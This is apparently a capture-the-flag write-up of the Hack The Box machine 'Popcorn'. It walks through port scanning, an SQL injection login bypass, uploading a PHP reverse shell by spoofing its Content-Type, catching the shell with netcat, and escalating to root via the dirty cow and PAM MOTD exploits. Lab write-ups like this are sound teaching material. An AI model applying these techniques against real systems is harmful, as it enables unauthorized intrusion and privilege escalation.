## Default Information
IP Address: 10.10.10.140\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.6    popcorn.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.6 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-19 02:12:30 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.6                                      
Discovered open port 80/tcp on 10.10.10.6
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From this output, there is only 1 web service that is running behind port 80.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22  | SSH | OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0) | Open |
| 80  | HTTP | Apache/2.2.12 (Ubuntu) | Open |

We will then use nmap to scan for vulnerabilities. From the output, we find that the Apache web server maybe vulnerable to CVE-2011-3192. However, this vulnearbility is a DOS and may not be very useful in this machine.

```
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
```

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://popcorn.htb:80.

```
http://10.10.10.6:80/index                (Status: 200) [Size: 177]
http://10.10.10.6:80/index.html           (Status: 200) [Size: 177]
http://10.10.10.6:80/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]
http://10.10.10.6:80/test                 (Status: 200) [Size: 47041]
http://10.10.10.6:80/test.php             (Status: 200) [Size: 47053]
http://10.10.10.6:80/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
```

### Web-content discovery

Visiting http://popcorn.htb/index and http://popcorn.htb/index.html, we realize that we will be redirected to the default page for the web server, which isn't of much use to us.

Visiting http://popcorn.htb/test and http://popcorn.htb/test.php, we are redurected to a phpinfo() page. From this page, we are able to gather some configuration information. 

```
Configuration file path: /etc/php5/apache2 
file_uploads : On
max_file_uploads : 50
server_root : /etc/apache2
document_root : /var/www
```

Visiting http://popcorn.htb/rename, we are able to find the syntax for the rename api. 
![Rename API syntax](https://github.com/joelczk/writeups/blob/main/HTB/Images/Popcorn/rename.png)

Visiting http://popcorn.htb/torrent, we realize that this is a torrent hoster page and we are required to login to be able to upload files or browser files.

## Exploit
### SQL Injection in login page

Using ```admin' or 1=1#``` for both usernames and passwords, we realize that we can login as an admin user on http://popcorn.htb/torrent/login.php
![SQL Injection on login](https://github.com/joelczk/writeups/blob/main/HTB/Images/Popcorn/login.png)

### Testing for LFI
Looking at http://popcorn.htb/torrent/index.php?mode=directory, we realize that we are able to find the categories of files that are uploaded on this site.
![Browse](https://github.com/joelczk/writeups/blob/main/HTB/Images/Popcorn/browse.png)

Looking at the url, we shall try to test for LFI vulnerability. Unfortunately, I am unable to exploit the LFI vulnerability.

### File Upload vulnerability

Recalling from visiting http://popcorn.htb/torrent/index.php?mode=directory that one of the categories of files is an image file, we will try to upload a JPG image onto the site. However, we soon realize that we are unable to upload the image file as it is an invalid torrent file. 

Modifying the file extensions to .torrent or .jpg.torrent does not yield any results as well as we are still unable to upload the file as it is an invalid torrent file. Hence, we can conclude that the backend probably does some verification of the file signature.
![Invalid Torrent file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Popcorn/invalid_torrent.png)

Next, we will have to create a valid torrent file from the jpg image file. We can easily do that from [here](https://kimbatt.github.io/torrent-creator/).

After we have successfully uploaded the torrent file, we realize that we can easily modify the screenshot that we have uploaded.
![Modify torrent](https://github.com/joelczk/writeups/blob/main/HTB/Images/Popcorn/modify_torrent.png)

Let us first try to modify the iamge into our php reverse shell code using double extensions by renaming the php reverse shell to ```shell.php.jpg```. However, this was unable to work as the file is interpreted as a jpg file. 

Now, what we do is that we will upload the php reverse shell but we will modify the Content-Type from application/x-php to image/jpeg

![Modify request](https://github.com/joelczk/writeups/blob/main/HTB/Images/Popcorn/modify_request.png)

This will successfully uplaod the php reverse shell. All we have to do is to refresh the page and click on the uploaded image to spawn the reverse shell. 
### Obtaining reverse shell
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.6] 52439
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
/bin/sh: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: python3: not found
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@popcorn:/$ export TERM=xterm
export TERM=xterm
www-data@popcorn:/$ stty cols 132 rows 34
stty cols 132 rows 34
www-data@popcorn:/$ 
```

### Obtaining user flag
We actually realize that even though the user is www-data, it has the privileges to obtain the user flag in /home/george/user.txt

```
www-data@popcorn:/$ cd /home
cd /home
www-data@popcorn:/home$ ls
ls
george
www-data@popcorn:/home$ cat george/user.txt
cat george/user.txt
<Redacted user flag>
```

### Privilege escalation to root
From linpeas, we notice that this machine is running on Linux version 2.6.31. This potentially means that the machine may be vulnerable to dirty cow exploit as dirty cow works on Linux versions <= 3.19.0-73.8

We will obtain the dirty cow exploit from searchsploit and transfer it to the our reverse shell. Afterwards, we will then compile the exploit and execute the exploit (Somehow, the cpp version of this exploit does not work properly on the machine). 

Executing the exploit will then create a new user firefart with root privileges.

```
www-data@popcorn:/$ su - firefart
su - firefart
Password: firefart

firefart@popcorn:~# id
id
uid=0(firefart) gid=0(root) groups=0(root)
```

### Obtaining root flag
```
firefart@popcorn:~# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```

## Post-Exploitation
### Exploiting motd.legal-displayed

Using linpeas, we can discover that there is a motd.legal-displayed file in /home/george/.cache directory.

```
╔══════════╣ Files inside others home (limit 20)
/home/george/.bash_logout                                                                                             
/home/george/.bashrc
/home/george/torrenthoster.zip
/home/george/.cache/motd.legal-displayed
/home/george/.sudo_as_admin_successful
/home/george/user.txt
/home/george/.nano_history
/home/george/.mysql_history
/home/george/.profile
```

However, this exploits is slightly unstable, and we would need to ensure that the permissions in /var/www/.ssh is being set properly.

```
www-data@popcorn:/tmp$ chmod 700 /var/www/.ssh/
chmod 700 /var/www/.ssh/
www-data@popcorn:/tmp$ ./motd.sh
./motd.sh
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: toor
```
### SQL Injection in torrent login

From /var/www/torrent.login.php, we can find a verify_login function where an SQL query is made to verify the login.

```
function verify_login($username, $password) {
/* verify the username and password.  if it is a valid login, return an array
 * with the username, firstname, lastname, and email address of the user */

        if (empty($username) || empty($password)) return false;

        $qid = db_query("
        SELECT userName, password, privilege, email
        FROM users
        WHERE userName = '$username' AND password = '" . md5($password) . "'
        ");

        return db_fetch_object($qid);
}
```
We realize that the username and password parameters are not properly sanitized so we are able to do an SQL injection.

```
$user = verify_login($_POST["username"], $_POST["password"]);
```

Using ```admin' or 1=1#``` as our username and password would mean that we are essentially executing the following SQL query (which eventually give us access to the admin page):

```
SELECT userName, password, privilege, email FROM users WHERE userName = 'admin' or 1=1 #' AND password = '" . md5($password) .
```

